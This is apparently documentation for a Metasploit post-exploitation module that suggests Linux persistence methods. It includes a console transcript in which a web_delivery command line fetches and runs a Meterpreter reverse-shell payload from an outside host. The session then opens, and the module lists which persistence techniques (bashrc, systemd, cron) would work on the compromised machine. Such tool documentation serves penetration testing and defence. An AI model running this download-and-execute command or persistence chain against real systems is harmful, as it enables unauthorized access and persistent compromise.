## Vulnerable Application

This module suggests persistence modules that can be used.
The modules are suggested based on the architecture and platform
that the user has a shell opened as well as the available exploits
in meterpreter.
It's important to note that not all modules will be checked.
Exploits are chosen based on these conditions: session type,
platform, architecture, and required default options.

## Verification Steps

1. Start msfconsole
2. Get a shell/meterpreter on a box
3. Do: `use post/multi/recon/persistence_suggester`
4. Do: `set session #`
5. Do: `run`
6. You should get information about which persistence modules will work.

## Options

### ValidateArch

This option lets us toggle whether or not a mismatch in session and module architecture should be validated or ignored.

### ValidatePlatform

This option lets us toggle whether or not a mismatch in session and module platform should be validated or ignored.

### ValidateMeterpreterCommands

This option lets us toggle whether or not Meterpreter commands that are missing from the current Meterpreter implementation should be validated or ignored.

### Colors

Similar to the option used for `HttpTrace`. This lets us change the colors used to show valid, invalid and ignored options or incompatibilities. Unsetting this option results in no colored output.

## Scenarios

### Ubuntu 24.04 User Shell

#### User Shell

```
└─$ ./msfconsole -q
[*] Processing /root/.msf4/msfconsole.rc for ERB directives.
resource (/root/.msf4/msfconsole.rc)> setg verbose true
verbose => true
resource (/root/.msf4/msfconsole.rc)> setg lhost 1.1.1.1
lhost => 1.1.1.1
resource (/root/.msf4/msfconsole.rc)> setg payload cmd/linux/http/x64/meterpreter/reverse_tcp
payload => cmd/linux/http/x64/meterpreter/reverse_tcp
resource (/root/.msf4/msfconsole.rc)> use exploit/multi/script/web_delivery
[*] Using configured payload cmd/linux/http/x64/meterpreter/reverse_tcp
resource (/root/.msf4/msfconsole.rc)> set target 7
target => 7
resource (/root/.msf4/msfconsole.rc)> set srvport 8082
srvport => 8082
resource (/root/.msf4/msfconsole.rc)> set uripath l
uripath => l
resource (/root/.msf4/msfconsole.rc)> set payload payload/linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
resource (/root/.msf4/msfconsole.rc)> set lport 4446
lport => 4446
resource (/root/.msf4/msfconsole.rc)> run
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
[*] Started reverse TCP handler on 1.1.1.1:4446 
[*] Using URL: http://1.1.1.1:8082/l
[*] Server started.
[*] Run the following command on the target machine:
wget -qO fTSGK2Dy --no-check-certificate http://1.1.1.1:8082/l; chmod +x fTSGK2Dy; ./fTSGK2Dy& disown
msf exploit(multi/script/web_delivery) > 
[*] 2.2.2.2    web_delivery - Delivering Payload (250 bytes)
[*] Transmitting intermediate stager...(126 bytes)
[*] Sending stage (3090404 bytes) to 2.2.2.2
[*] Meterpreter session 1 opened (1.1.1.1:4446 -> 2.2.2.2:34530) at 2025-09-23 16:35:57 -0400

msf exploit(multi/script/web_delivery) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > sysinfo
Computer     : 2.2.2.2
OS           : Ubuntu 24.04 (Linux 6.8.0-31-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > getuid
Server username: ubuntu
meterpreter > background
[*] Backgrounding session 1...
```

#### Persistence Suggester

```
msf exploit(multi/script/web_delivery) > use post/multi/recon/persistence_suggester 
[*] Using configured payload cmd/linux/http/x64/meterpreter/reverse_tcp
msf post(multi/recon/persistence_suggester) > set session 1
session => 1
msf post(multi/recon/persistence_suggester) > exploit
[*] 2.2.2.2 - Collecting persistence modules for x64/linux...
[*] 2.2.2.2 - The following 15 exploit checks are being tried:
[*] 2.2.2.2 - exploit/linux/persistence/apt_package_manager
[*] 2.2.2.2 - exploit/linux/persistence/autostart
[*] 2.2.2.2 - exploit/linux/persistence/bash_profile
[*] 2.2.2.2 - exploit/linux/persistence/docker_image
[*] 2.2.2.2 - exploit/linux/persistence/init_openrc
[*] 2.2.2.2 - exploit/linux/persistence/init_systemd
[*] 2.2.2.2 - exploit/linux/persistence/kate_plugin
[*] 2.2.2.2 - exploit/linux/persistence/motd
[*] 2.2.2.2 - exploit/linux/persistence/rc_local
[*] 2.2.2.2 - exploit/linux/persistence/yum_package_manager
[*] 2.2.2.2 - exploit/multi/persistence/at
[*] 2.2.2.2 - exploit/multi/persistence/cron
[*] 2.2.2.2 - exploit/multi/persistence/joplin_plugin
[*] 2.2.2.2 - exploit/multi/persistence/obsidian_plugin
[*] 2.2.2.2 - exploit/windows/persistence/image_exec_options
[*] 2.2.2.2 - exploit/linux/persistence/apt_package_manager: The target is not exploitable. /etc/apt/apt.conf.d/ not writable
[*] 2.2.2.2 - exploit/linux/persistence/autostart: The target is not exploitable. Xorg is not installed, likely a server install. Autostart requires a graphical environment
[+] 2.2.2.2 - exploit/linux/persistence/bash_profile: The service is running, but could not be validated. Bash profile exists and is writable: /home/ubuntu/.bashrc
[*] 2.2.2.2 - exploit/linux/persistence/docker_image: The target is not exploitable. docker is required
[*] 2.2.2.2 - exploit/linux/persistence/init_openrc: The target is not exploitable. /etc/init.d/ isnt writable
[+] 2.2.2.2 - exploit/linux/persistence/init_systemd: The target appears to be vulnerable. /tmp/ is writable and system is systemd based
[*] 2.2.2.2 - exploit/linux/persistence/kate_plugin: The target is not exploitable. Kate not found
[*] 2.2.2.2 - exploit/linux/persistence/motd: The target is not exploitable. /etc/update-motd.d/ is not writable
[*] 2.2.2.2 - exploit/linux/persistence/rc_local: The target is not exploitable. /etc/ isnt writable
[*] 2.2.2.2 - exploit/linux/persistence/yum_package_manager: The target is not exploitable. /usr/local/bin/ not writable
[*] 2.2.2.2 - exploit/multi/persistence/at: The target is not exploitable.  does not exist
[+] 2.2.2.2 - exploit/multi/persistence/cron: The target appears to be vulnerable. Cron timing is valid, no cron.deny entries found
[*] 2.2.2.2 - exploit/multi/persistence/obsidian_plugin: The target is not exploitable. No vaults found

[*] 2.2.2.2 - Valid modules for session 1:
============================

 #   Name                                           Potentially Vulnerable?  Check Result
 -   ----                                           -----------------------  ------------
 1   exploit/linux/persistence/bash_profile         Yes                      The service is running, but could not be validated. Bash profile exists and is writable: /home/ubuntu/.bashrc
 2   exploit/linux/persistence/init_systemd         Yes                      The target appears to be vulnerable. /tmp/ is writable and system is systemd based
 3   exploit/multi/persistence/cron                 Yes                      The target appears to be vulnerable. Cron timing is valid, no cron.deny entries found
 4   exploit/linux/persistence/apt_package_manager  No                       The target is not exploitable. /etc/apt/apt.conf.d/ not writable
 5   exploit/linux/persistence/autostart            No                       The target is not exploitable. Xorg is not installed, likely a server install. Autostart requires a graphical environment
 6   exploit/linux/persistence/docker_image         No                       The target is not exploitable. docker is required
 7   exploit/linux/persistence/init_openrc          No                       The target is not exploitable. /etc/init.d/ isnt writable
 8   exploit/linux/persistence/kate_plugin          No                       The target is not exploitable. Kate not found
 9   exploit/linux/persistence/motd                 No                       The target is not exploitable. /etc/update-motd.d/ is not writable
 10  exploit/linux/persistence/rc_local             No                       The target is not exploitable. /etc/ isnt writable
 11  exploit/linux/persistence/yum_package_manager  No                       The target is not exploitable. /usr/local/bin/ not writable
 12  exploit/multi/persistence/at                   No                       The target is not exploitable.  does not exist
 13  exploit/multi/persistence/obsidian_plugin      No                       The target is not exploitable. No vaults found


[*] 2.2.2.2 - Current Session Info:
[*] 2.2.2.2 -   Session Type: meterpreter
[*] 2.2.2.2 -   Architecture: x64
[*] 2.2.2.2 -   Platform: linux
[*] 2.2.2.2 - Incompatible modules for session 1:
===================================

 #  Name                                            Reasons                                                                  Platform  Architecture              Session Type
 -  ----                                            -------                                                                  --------  ------------              ------------
 1  exploit/multi/persistence/joplin_plugin         Not Compatible (platform)                                                Unix      cmd                       meterpreter, shell
 2  exploit/windows/persistence/image_exec_options  Missing required module options (IMAGE_FILE). Not Compatible (platform)  Windows   No defined architectures  meterpreter

[*] Post module execution completed
msf post(multi/recon/persistence_suggester) > notes

Notes
=====

 Time                     Host           Service  Port  Protocol  Type                          Data
 ----                     ----           -------  ----  --------  ----                          ----
 2025-09-23 20:29:52 UTC  2.2.2.2                                 persistence.suggested_module  {"exploit/linux/persistence/bash_profile"=>"The service is running, but could not be validated. Bash profile exists and is writable: /home/ubuntu/.bashrc",
                                                                                                "exploit/linux/persistence/init_systemd"=>"The target appears to be vulnerable. /tmp/ is writable and system is systemd based",
                                                                                                "exploit/multi/persistence/cron"=>"The target appears to be vulnerable. Cron timing is valid, no cron.deny entries found"}
 2025-09-23 20:35:56 UTC  2.2.2.2                                 host.os.session_fingerprint   {:name=>"2.2.2.2", :os=>"Ubuntu 24.04 (Linux 6.8.0-31-generic)", :arch=>"x64"}
```